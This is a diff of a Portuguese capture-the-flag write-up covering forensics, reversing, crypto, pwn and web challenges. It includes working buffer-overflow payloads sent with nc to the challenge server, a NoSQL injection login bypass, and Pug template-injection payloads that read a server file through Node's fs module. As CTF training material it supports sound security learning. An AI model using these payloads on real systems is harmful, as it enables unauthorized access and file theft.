@@ -27,17 +27,18 @@ OBS.: Até o momento não sei se os desafios ficarão disponíveis após a sele�
   - Me dá o c\*\*kie?
   - App Sec
 
+
 ## **Misc**
 
 ### **Boas vindas - Seleção RSI 2022**
 
-![descrição do primeiro desafio de misc](images/boas_vindas.jpg)
+![descrição do primeiro desafio de misc](./images/boas_vindas.png)
 
 Esse era o desafio introdutório do CTF, só era preciso ler a descrição e pegar a flag no fim do texto
 
 ### **Consegue rodar?**
 
-![descrição do segundo desafio de misc](images/consegue_rodar.png)
+![descrição do segundo desafio de misc](./images/consegue_rodar.png)
 
 Nesse desafio era fornecido um binário ELF, verifiquei isso com o comando file
 
@@ -64,9 +65,9 @@ R$1{~FLAG~}
 
 ### **Metaverso? lul**
 
-![descrição do primeiro desafio de forense](images/metaverso.png)
+![descrição do primeiro desafio de forense](./images/metaverso.png)
 
-Como a descrição informa, o nome do desafio é uma dica, o que me levou a explorar os metadados da imagem para ver se havia alguma alguma informação, como em todo inicio, eu rodei o comando file para verificar o tipo de arquivo.
+Como a descrição informa, o nome do desafio é uma dica, o que me levou a explorar os metadados da imagem para ver se havia alguma informação, como em todo inicio, eu rodei o comando file para verificar o tipo de arquivo.
 
 ```
 $ file flag1.jpg
@@ -132,7 +133,7 @@ R$1{~FLAG~}
 
 ### **Zzzzzzzzip**
 
-![descrição do segundo desafio de forense](images/zip.png)
+![descrição do segundo desafio de forense](./images/zip.png)
 
 A primeira observação foi: o nome do desafio é zip, mas o arquivo fornecido é uma imagem, então verifiquei com o file se o tipo realmente correspondia com a extensão, e sim, realmente o arquivo é uma imagem:
 
@@ -180,7 +181,7 @@ Referências que usei para resolver os desafios:
 
 ### **BOF para leigos**
 
-![descrição do primeiro desafio de pwn](images/bof_leigo.png)
+![descrição do primeiro desafio de pwn](./images/bof_leigo.png)
 
 ```c
 #include <stdio.h>
@@ -239,7 +240,7 @@ Parabéns você modificou a variavel x!
 
 ### **BOF para leitores**
 
-![descrição do primeiro desafio de pwn](images/bof_leigo.png)
+![descrição do primeiro desafio de pwn](./images/bof_leigo.png)
 
 Código do programa:
 
@@ -296,15 +297,15 @@ Não saiu como esperado, então usei o edb-debugger para verificar o que estava 
 $  python3 -c "print('A' * 64 + '\x89\x68\x45')" | edb --run ./bof2
 ```
 
-![descrição do segundo desafio de pwn](images/bof2_registers.png)
+![descrição do segundo desafio de pwn](./images/bof2_registers.png)
 
-e pude ver que é incluído um '0xc2' logo após os A's, que imagino que sejam colocados pela função gets, o 0xc2 acupa mais de um byte de char, então o que fiz foi remover um dos A's enviados, dessa forma logo após finalizar a string de 63 "s, o 0xc2 seria colocado na posição 64 e o valor do endereço ficaria correto
+e pude ver que é incluído um '0xc2' logo após os A's, que imagino que sejam colocados pela função gets, o 0xc2 acupa mais de um byte de char, então o que fiz foi remover um dos A's enviados, dessa forma logo após finalizar a string de 63 A's, o 0xc2 seria colocado na posição 64 e o valor do endereço ficaria correto
 
 ```
 $  python3 -c "print('A' * 63 + '\x89\x68\x45')" | edb --run ./bof2
 ```
 
-![descrição do segundo desafio de pwn](images/bof2_registers2.png)
+![descrição do segundo desafio de pwn](./images/bof2_registers2.png)
 
 e agora que o valor está correto ele passa na comparação e retorna a flag
 
@@ -318,7 +319,7 @@ Parabéns você modificou a variavel x!
 
 ### **BOF + Redirect**
 
-![descrição do terceiro desafio de pwn](images/bof_redirect.png)
+![descrição do terceiro desafio de pwn](./images/bof_redirect.png)
 
 Esse desafio, além do código que é fornecido em todos os desafios, contém também o binário compilado
 
@@ -373,7 +374,7 @@ Vamos para o endereço:0x4141414141414141
        117405 segmentation fault (core dumped)  ./bof103
 ```
 
-Com 100 bytes eu consegui sobrescrever o endereço de retorno, não sei exatamente quantos bytes são necessários, como o programa diz para qual endereço ele está indo, fiz esse processo por tentativa e erro e vi que com 88 bytes o programa já dá segmentation fault.
+Com 100 bytes eu consegui sobrescrever o endereço de retorno, não sei exatamente quantos bytes são necessários, como o programa diz para qual endereço ele está indo, fiz esse processo por tentativa e erro e vi que com 88 bytes o programa já dá segmentation fault, logo eu preciso de 87 bytes.
 
 O próximo passo era descobrir o endereço da função win
 
@@ -394,7 +395,7 @@ Dump of assembler code for function win:
 End of assembler dump.
 ```
 
-O endereço é 0x0000000000401196, depois disso foi criar um payload semelhante aos outros desafios
+O endereço é 0x0000000000401196, depois disso criei um payload semelhante aos outros desafios
 
 ```
 $ python3 -c "print('A' * 87 + '\x96\x11\x40\x00\x00\x00\x00\x00')" | nc projetorsi.com.br 9003
@@ -405,7 +406,7 @@ R$1{~FLAG~}
 
 ### **Introdução à Engenharia Reversa**
 
-![descrição do primeiro desafio de rev](images/intro_rev.png)
+![descrição do primeiro desafio de rev](./images/intro_rev.png)
 
 Código do programa:
 
@@ -518,9 +519,9 @@ R$1{~FLAG~}
 
 ### **babystrings**
 
-![descrição do segundo desafio de rev](images/babystr.png)
+![descrição do segundo desafio de rev](./images/babystr.png)
 
-Para conseguir, apenas executei o comando strings como diz o noem do desafio
+Para conseguir, apenas executei o comando strings como diz o nome do desafio
 
 ```
 $ strings babystrings | grep "R\$1"
@@ -529,7 +530,7 @@ R$1{~FLAG~}
 
 ### **babystrings-wide**
 
-![descrição do terceiro desafio de rev](images/babystr_wide.png)
+![descrição do terceiro desafio de rev](./images/babystr_wide.png)
 
 Assim como no anterior, esse desafio faz referência ao comando strings, mas diz que a flag está melhor escondida. Eu executei o strings e ele não exibiu a flag, então alterei o enconding para big endian 16bits e ele me retorna a flag
 
@@ -540,7 +541,7 @@ R$1{~FLAG~}
 
 ### **stack**
 
-![descrição do quarto desafio de rev](images/stack.png)
+![descrição do quarto desafio de rev](./images/stack.png)
 
 Diferente dos outros, nesse desafio não era possível ver a flag com strings, então executei ele para tentar encontrar alguma coisa e ele não mostra nada.
 Então eu disassemblei a função main com o gdb e vi que ele move vários valores para a stack, que achei que fossem a flag
@@ -594,9 +595,65 @@ O que fiz foi pegar cada um desse valores e colocar num decode de hexa para asci
 
 0x52 0x24 0x31 ... 0x21 0x7d
 
+### loops
+![](./images/loops.png)
+
+Nesse desafio era fornecido um código em assembly: 
+
+```
+;; cdecl calling convention
+
+asm_function:
+        push ebp
+        mov ebp, esp
+        mov eax, DWORD [ebp+0x8]
+        mov ebx, DWORD [ebp+0xC]
+        mov ecx, 10
+
+subroutine:
+        add eax, 1
+        mul ebx
+        dec ecx
+        cmp ecx, 0
+        jnz subroutine
+        pop ebp
+        ret
+
+```
+ele quer saber qual seria a saída se os parametros fossem 0x01 e 0x02, iniciando pelo comentário, fui ler sobre cdecl e descobri que os parametros são empurrados para a stack da direita para a esquerda, isso significa que ficariam assim
+|  stack  |
+|  ------ |
+| 0x01  |
+| 0x02  |
+
+em asm_function ele move os valores da pilha para eax e ebx, com isso consegui os valores iniciais: eax = 1, ebx = 2
+
+Em subroutine: ele executa várias instruções para alterar os valores, li sobre algumas delas para entender o código
+
+- add -> faz a soma dos operandos que são passados
+- mul -> é uma instrução que multiplica o valor de eax pelo operando que é passado
+- dec -> subtrai 1 do operando
+- cmp -> compara os valores o operando
+- jnz -> jump not zero, salta para o operando caso a flag zf seja 0
+
+Com essas informações eu criei um fluxo que eu conseguisse entender do programa, o código que imaginei que fosse análogo foi esse:
+```python
+eax = 1
+ebx = 2
+ecx = 10
+while True:
+  eax = eax + 1
+  eax = eax * ebx
+  ecx = ecx - 1
+  if ecx == 0:
+    break
+print(hex(eax))
+```
+Coloquei a saída do programa no padrão da flag e submeti
+
 ### **pyme**
 
-![descrição do quarto desafio de rev](images/pyme.png)
+![descrição do quarto desafio de rev](./images/pyme.png)
 
 Esse arquivo contem um zip com vários arquivos dentro, um deles chamado main que é um binário
 
@@ -624,7 +681,7 @@ $ strings main
 pydata
 ```
 
-Mas executando o readelf é possível ver que essa string é na verdade o nome de uma seção do binário
+Executando o readelf é possível ver que essa string é na verdade o nome de uma seção do binário
 
 ```
 $ readelf --section-headers main
@@ -643,7 +700,7 @@ Key to Flags:
 
 ```
 
-Isso significa que é um script python que foi compilado, procurando no google vi que existe uma biblioteca chamada pyinstaller que já justamente esse processo de transformar um script python em um binário, fiz alguns testes e vi que ela adicionava uma seção chamada pydata nos meu binários também, então procurei algo de fizesse o reverso e encontrei o [PyInstallerExtractor](https://github.com/extremecoders-re/pyinstxtractor), fiz o clone e executei ele no arquivo main:
+Isso significa que é um script python que foi compilado, procurando no google vi que existe uma biblioteca chamada pyinstaller que faz justamente esse processo de transformar um script python em um binário, fiz alguns testes e vi que ela adicionava uma seção chamada pydata nos meu binários também, então procurei algo de fizesse o reverso e encontrei o [PyInstallerExtractor](https://github.com/extremecoders-re/pyinstxtractor), fiz o clone e executei ele no arquivo main:
 
 ```
 $ git clone https://github.com/extremecoders-re/pyinstxtractor
@@ -667,20 +724,20 @@ main.py
 
 ### **Rato Ordinário Tripulante 13**
 
-![descrição do primeiro desafio de cripto](images/ROT13.png)
+![descrição do primeiro desafio de cripto](./images/ROT13.png)
 
 O nome do desafio é uma dica, se pegar as iniciais fica ROT13 que é uma cifra de rotação onde as letras são deslocadas em 13 posições,
 basta pegar a flag cifrada e jogar num decode de rot13
 
-![descrição do primeiro desafio de cripto](images/rot13_dec.png)
+![descrição do primeiro desafio de cripto](./images/rot13_dec.png)
 
 ## **Web**
 
 ### **Que diabos é JS?**
 
-![descrição do primeiro desafio de web](images/js_web.png)
+![descrição do primeiro desafio de web](./images/js_web.png)
 
-O desafio tem um site onde o usuário pode colocar uma senha, como o nome do desafio menciona js, então eu inspecionei o código-fonte para ver se existia algum código em javascript que pudesse me levar a flag e encontrei esse trecho de código
+O desafio tem um site onde o usuário pode colocar uma senha, como o nome do desafio menciona js, eu inspecionei o código-fonte para ver se existia algum código em javascript que pudesse me levar a flag e encontrei esse trecho de código
 
 ```javascript
 async function open_safe() {
@@ -736,11 +793,11 @@ R$1{~FLAG~}
 
 ### **Me dá o C\*\*kie?**
 
-![descrição do segundo desafio de web](images/cookie.png)
+![descrição do segundo desafio de web](./images/cookie.png)
 
 Olhando a aplicação, não encontrei nada no código-fonte, então fui olhar os cabeçalhos de requisição e resposta e vi que na resposta ele seta um cookie chamado admin para 0, então eu alterei o valor do cookie para 1 e recarreguei, isso não funcionou.
 
-![](images/cookie_admin_0.png)
+![](./images/cookie_admin_0.png)
 
 Pensando no motivo de não ter funcionado, vi que além desse cookie, existe também um cookie de sessão, que provavelmente era associado ao usuário, então novamente setei o cookie para 1 e apaguei o cookie session. Dessa vez a tela mudou para "oi Admin" e um novo cookie chamado token foi setado
 
@@ -748,7 +805,7 @@ Como o nome do desafio era me dá o c\*\*kie, coloquei o valor do cookie no padr
 
 ### AppSec
 
-!['desafio de web](images/appsec.png)
+!['desafio de web](./images/appsec.png)
 
 Esse foi o desafio que demorei mais tempo para fazer, então vou tentar detalhar mais o processo todo
 
@@ -762,8 +819,8 @@ $ cd AppSec
 $ docker-compose up
 ```
 
-Depois que o docker baixou as imagens e montou os containers, então é acessei localhost:3000 para ver a aplicação
-!['desafio de web](images/app_site.png)
+Depois que o docker baixou as imagens e montou os containers, wu acessei localhost:3000 para ver a aplicação
+!['desafio de web](./images/app_site.png)
 
 - Passo 2: Explorar a aplicação
 
@@ -772,7 +829,7 @@ Depois que o docker baixou as imagens e montou os containers, então é acessei 
 
 - Passo 3: Explorar o código
 
-!['desafio de web](images/dir_ss.png)
+!['desafio de web](./images/dir_ss.png)
 
 Essa é a estrutura do projeto, o arquivo principal app.js, a inicialização do banco em db.js, as funções que são executadas ao acessar a rota na pasta routes, as views na pasta views e assim por diante.
 
@@ -821,7 +878,7 @@ router.post("/login", async (req, res) => {
 });
 ```
 
-Quando um login é feito ele busca o usuário e depois confere se os campos que ele achou são iguais aos campos que foram passados pela aplicação, então ele cria o token com as informações do usuário e o campo signed: true, pesquisei o que isso significava e acchei isso: https://stackoverflow.com/questions/11897965/what-are-signed-cookies-in-connect-expressjs. Ele diz que um signed cookie recebe uma assinatura e verifica se o cookie havia sido modificado, que era justamente o que eu estava fazendo, por isso ao modificar, eu era barrado no checkLogin
+Quando um login é feito ele busca o usuário e depois confere se os campos que ele achou são iguais aos campos que foram passados pela aplicação, então ele cria o token com as informações do usuário e o campo signed: true, pesquisei o que isso significava e achei isso: https://stackoverflow.com/questions/11897965/what-are-signed-cookies-in-connect-expressjs. Ele diz que um signed cookie recebe uma assinatura e verifica se o cookie havia sido modificado, que era justamente o que eu estava fazendo, por isso ao modificar, eu era barrado no checkLogin
 
 Então passei para outra linha de pensamento, voltando para o arquivo user.js na função login eu vi que não havia nenhuma tratativa na busca de usuário
 Também percebi que no arquivo db.js ele inseria um usuário com com o campo active como true, isso me permitiria efetuar a compra em /shop
@@ -845,7 +902,7 @@ Então já tinha um usuário e tinha que descobrir a sua senha, como não há tr
 
 - Passo 4: NoSQL Injection
   Com o BurpSuit eu interceptei um requisição de login e alterei o password para [$exists]=true
-  ![](images/burp.png)
+  ![](./images/burp.png)
 
 Caso a vulnerabilidade existisse, ele ia acessar a rota de login via post e ao pegar os dados enviados e iria fazer uma busca assim:
 
@@ -862,9 +919,9 @@ E isso aconteceu, porém na linha seguinte, ele verifica se os dados enviados er
 if (rec.username === username && rec.password === password)
 ```
 
-![](images/youbad.png)
+![](./images/youbad.png)
 
-Mas isso já é informação suficiente para escrever uma script para procurar a flag, já existem alguns prefeitos e eu me baseei em um do [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-urlencoded-body)
+Mas isso já é informação suficiente para escrever uma script para procurar a flag, já existem alguns preparados e eu me baseei em um do [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-urlencoded-body)
 
 - Passo 5: Payload
   Como o script já vem preparado, eu só alterei algumas coisas, o script final ficou assim:
@@ -900,7 +957,7 @@ while True:
         break
 ```
 
-Com isso eu consegui encontrar a flag do usuário rabbit e fazer o login
+Com isso eu consegui encontrar a senha do usuário rabbit e fazer o login
 
 - Passo 6: Explorar como obter a flag
   Até esse momento eu achava que seria algo como um LFI na rota order via POST
@@ -921,14 +978,14 @@ Meu pensamento era que no campo address eu pudesse passar '../../flag' e buscar 
 
 Olhando no console que estava acontecendo percebi que ele dava o seguinte erro
 
-![](images/erro_web.png))
+![](./images/erro_web.png))
 
 Ele tenta executar o que eu coloco como um código. como isso acontecia fui ler sobre SSTI no pug, que é o template engine usado no projeto: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection. Eu vi que os templates são interpretados dentro de um #{} e dentro é possível colocar código javascript, comprovei a vulnerabilidade injetando um #{(()=>{return "A"})()}
 
-![](images/candy.png)
-![](images/candy_order.png)
+![](./images/candy.png)
+![](./images/candy_order.png)
 
-Ele exibe no exatamente o meu retorno, então parti para fazer o meu template injection, olhei algumas coisas na internet, mas preferi fazer do meu jeito
+Ele exibe no exatamente o meu retorno, então parti para fazer o meu template injection, olhei algumas coisas na internet, a maioria monta um shell e eu precisava somente ler o conteúdo do arquivo flag, então adaptei.
 
 - Passo não sei mais qual passo eu tô: Criar um template injection
   Eu comecei vendo que objetos eu poderia usar, para isso usei o console do próprio container pra mostrar as saídas e fui verificando e consultando no google o que era costumeiro usar, vi que muitos template injections usavam um objeto chamado global.process.mainModule e eu fui testá-lo
@@ -945,13 +1002,13 @@ Ele exibe no exatamente o meu retorno, então parti para fazer o meu template in
   #{(()=>{console.log(global.process.mainModule.require('fs').readFileSync('../../flag', 'utf8'))})()}
   ```
 
-  Isso deu certo, a flag estava sendo exibida no meu console, agora eu tinah que retorná-la pra aplicação
+  Isso deu certo, a flag estava sendo exibida no meu console, agora eu tinha que retorná-la pra aplicação
 
 ```javascript
   #{(()=>{return global.process.mainModule.require('fs').readFileSync('../../flag', 'utf8')})()}
 ```
 
 E aqui está a flag sendo exibida na aplicação
-![](images/appsec_flag.png)
+![](./images/appsec_flag.png)
 
-Depois disso, eu só segui os mesmos passos no servidor, executei o script para descobrir a senha do usuário e depois executei o template injection para descobrir a flag
+Depois disso, eu só segui os mesmos passos no servidor, executei o script para descobrir a senha do usuário rabbit e depois executei o template injection para descobrir a flag
